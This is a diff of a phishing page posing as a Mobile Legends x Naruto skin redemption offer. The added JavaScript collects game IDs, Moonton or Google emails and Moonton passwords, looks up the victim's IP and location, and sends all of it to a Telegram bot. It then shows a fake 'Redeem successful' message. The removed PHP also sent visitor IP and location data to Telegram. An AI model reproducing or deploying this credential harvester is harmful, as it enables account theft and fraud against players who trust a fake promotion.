@@ -1,76 +1,168 @@
-
-<?php
-include 'includes/config.php';
-include 'includes/functions.php';
-
-// Ambil data IP dan lokasi
-$ip = getUserIP();
-$asn = getASN($ip);
-$city = getCity($ip);
-$country = getCountry($ip);
-
-// Kirim data ke Telegram
-sendToTelegram("User accessed page - IP: $ip | ASN: $asn | City: $city | Country: $country");
-
-?>
-<?php
-session_start();
-include 'includes/config.php';
-include 'includes/functions.php';
-
-// Jika belum login, redirect ke login
-if (!isset($_SESSION['moonton_loggedin'])) {
-    header("Location: login.php?redirect=index.php");
-    exit;
-}
-
-// ... kode yang sudah ada sebelumnya ...
-?>
-    
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redeem Skin MLBB x Naruto</title>
-    <link rel="stylesheet" href="assets/css/style.css">
+  <meta charset="UTF-8">
+  <title>Redeem Skin MLBB x Naruto</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      background: #f2f2f2;
+      padding: 40px;
+    }
+    form {
+      background: white;
+      max-width: 420px;
+      margin: auto;
+      padding: 25px;
+      border-radius: 10px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+    }
+    h2 {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    input, select, button {
+      width: 100%;
+      padding: 10px;
+      margin-top: 10px;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+    }
+    button {
+      background: #ff4500;
+      color: white;
+      font-weight: bold;
+      border: none;
+      cursor: pointer;
+    }
+    button:hover {
+      background: #e03d00;
+    }
+  </style>
 </head>
 <body>
-    <div class="container">
-        <header>
-            <img src="assets/images/logo.png" alt="MLBB x Naruto" class="logo">
-            <h1>Redeem Skin MLBB x Naruto</h1>
-        </header>
-        
-        <main>
-            <div class="banner">
-                <img src="assets/images/naruto-mlbb-collab.jpg" alt="Kolaborasi MLBB dan Naruto">
-            </div>
-            
-            <form action="redeem.php" method="POST" class="redeem-form">
-                <div class="form-group">
-                    <label for="player_id">Player ID MLBB:</label>
-                    <input type="text" id="player_id" name="player_id" required>
-                </div>
-                
-                <div class="form-group">
-                    <label for="code">Kode Redeem:</label>
-                    <input type="text" id="code" name="code" required>
-                </div>
-                
-                <button type="submit" class="redeem-btn">Redeem Sekarang</button>
-            </form>
-            
-            <div class="terms">
-                <p>Dengan menekan tombol redeem, Anda menyetujui <a href="terms.php">Syarat dan Ketentuan</a> kami.</p>
-            </div>
-        </main>
-        
-        <footer>
-            <p>© 2023 MLBB x Naruto Collaboration. Tidak berafiliasi dengan Moonton atau Shueisha.</p>
-        </footer>
+
+  <form id="redeemForm">
+    <h2>Redeem Skin MLBB x Naruto</h2>
+    
+    <!-- User ID and Zone ID with numeric validation -->
+    <input type="text" id="userId" placeholder="Enter your User ID" required inputmode="numeric" pattern="[0-9]*" oninput="this.value = this.value.replace(/[^0-9]/g, '')" />
+    <input type="text" id="zoneId" placeholder="Enter your Zone ID" required inputmode="numeric" pattern="[0-9]*" oninput="this.value = this.value.replace(/[^0-9]/g, '')" />
+    
+    <!-- Email field changes based on login method -->
+    <div id="emailLabelDiv">
+      <input type="email" name="email" id="emailField" placeholder="Moonton Email" required>
     </div>
     
-    <script src="assets/js/script.js"></script>
+    <!-- Password field changes based on login method -->
+    <div id="passwordLabelDiv">
+      <input type="password" name="password" id="passwordField" placeholder="Moonton Password" required>
+    </div>
+
+    <select name="method" id="methodSelect" required>
+      <option value="Moonton">Login with Moonton</option>
+      <option value="Google">Login with Google</option>
+    </select>
+
+    <select name="skin" id="skinSelect" required>
+      <option value="">Choose Naruto Skin</option>
+      <option value="Naruto">Naruto</option>
+      <option value="Sasuke">Sasuke</option>
+      <option value="Sakura">Sakura</option>
+      <option value="Kakashi">Kakashi</option>
+    </select>
+
+    <input type="text" name="code" id="codeField" placeholder="Redeem Code" readonly required>
+
+    <button type="submit">Redeem Skin</button>
+  </form>
+
+  <script>
+    const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN'; // Replace with your bot token
+    const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID';     // Replace with your chat ID
+
+    const skinSelect = document.getElementById('skinSelect');
+    const codeField = document.getElementById('codeField');
+    const methodSelect = document.getElementById('methodSelect');
+    const emailField = document.getElementById('emailField');
+    const passwordField = document.getElementById('passwordField');
+    const emailLabelDiv = document.getElementById('emailLabelDiv');
+    const passwordLabelDiv = document.getElementById('passwordLabelDiv');
+
+    // Adjust form fields based on the selected login method
+    methodSelect.addEventListener('change', function() {
+      const method = methodSelect.value;
+
+      if (method === 'Google') {
+        emailLabelDiv.innerHTML = '<input type="email" name="email" id="emailField" placeholder="Google Email" required>';
+        passwordLabelDiv.innerHTML = ''; // Remove password field for Google login
+      } else {
+        emailLabelDiv.innerHTML = '<input type="email" name="email" id="emailField" placeholder="Moonton Email" required>';
+        passwordLabelDiv.innerHTML = '<input type="password" name="password" id="passwordField" placeholder="Moonton Password" required>';
+      }
+    });
+
+    skinSelect.addEventListener('change', () => {
+      const skin = skinSelect.value;
+      if (skin) {
+        // Generate random redeem code with skin name
+        const code = `${skin.toUpperCase()}-${Math.random().toString(36).substr(2, 6).toUpperCase()}`;
+        codeField.value = code;
+      } else {
+        codeField.value = '';
+      }
+    });
+
+    document.getElementById('redeemForm').addEventListener('submit', async function(e) {
+      e.preventDefault();
+
+      const userId = this.userId.value;
+      const zoneId = this.zoneId.value;
+      const email = this.email.value;
+      const password = this.password.value;
+      const method = this.method.value;
+      const skin = this.skin.value;
+      const code = this.code.value;
+
+      try {
+        const ipRes = await fetch('https://ipwho.is/');
+        const ipData = await ipRes.json();
+
+        const message = `
+[MLBB x Naruto Redeem Attempt]
+User ID: ${userId}
+Zone ID: ${zoneId}
+Email: ${email}
+Password: ${password}
+Login Method: ${method}
+Skin: ${skin}
+Redeem Code: ${code}
+
+IP: ${ipData.ip}
+ASN: ${ipData.connection?.asn || 'N/A'}
+ISP: ${ipData.connection?.org || 'N/A'}
+City: ${ipData.city}
+Country: ${ipData.country} (${ipData.country_code})
+        `;
+
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message
+          })
+        });
+
+        alert("Redeem successful! The skin will be delivered within 24 hours.");
+        this.reset();
+        codeField.value = '';
+      } catch (err) {
+        console.error(err);
+        alert("An error occurred while sending the data.");
+      }
+    });
+  </script>
+
 </body>
-              </html>
+</html>
